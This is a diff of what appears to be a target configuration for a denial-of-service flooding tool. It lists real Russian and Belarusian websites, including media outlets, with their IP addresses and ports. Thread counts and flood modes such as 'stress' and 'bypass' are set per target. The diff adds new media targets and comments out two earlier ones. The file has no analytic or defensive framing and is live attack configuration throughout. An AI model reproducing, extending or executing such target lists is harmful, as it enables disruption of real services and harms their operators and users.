@@ -19,9 +19,12 @@
 
 https://ekdostavka.ru http://ekdostavka.ru 94.250.254.110:80 94.250.254.110:443 https://94.250.254.110:443 tcp://94.250.254.110:21 tcp://94.250.254.110:22 tcp://94.250.254.110:80 tcp://94.250.254.110:443 tcp://94.250.254.110:53  -t 2000 --http-methods stress get head
 
-https://cargocash.ru/ http://cargocash.ru/  http://188.225.36.11:80 http://188.225.36.11:443 https://188.225.36.11:443 tcp://188.225.36.11:22 tcp://188.225.36.11:80 tcp://188.225.36.11:143 tcp://188.225.36.11:3306 tcp://188.225.36.11:443 -t 1000 --http-methods stress get head
 
-94.228.116.171:80 94.228.116.171:443 https://94.228.116.171:443 tcp://94.228.116.171:443 tcp://94.228.116.171:22 tcp://94.228.116.171:80 tcp://94.228.116.171:143 tcp://94.228.116.171:3306 -t 1000 --http-methods stress get head
+https://www.5-tv.ru http://www.5-tv.ru https://www.5-tv.ru/schedule/ http://ctv.by http://ctv.by/tv-programm-voskr https://www.sb.by https://www.sb.by/articles/themes/situatsiya-vokrug-dnr-i-lnr/ 151.236.80.10:80 151.236.80.10:443 tcp://151.236.80.10:80 tcp://151.236.80.10:443 -t 3000 --http-methods stress bypass head
+
+
+#https://cargocash.ru/ http://cargocash.ru/  http://188.225.36.11:80 http://188.225.36.11:443 https://188.225.36.11:443 tcp://188.225.36.11:22 tcp://188.225.36.11:80 tcp://188.225.36.11:143 tcp://188.225.36.11:3306 tcp://188.225.36.11:443 -t 1000 --http-methods stress get head
+#94.228.116.171:80 94.228.116.171:443 https://94.228.116.171:443 tcp://94.228.116.171:443 tcp://94.228.116.171:22 tcp://94.228.116.171:80 tcp://94.228.116.171:143 tcp://94.228.116.171:3306 -t 1000 --http-methods stress get head
 
 
 
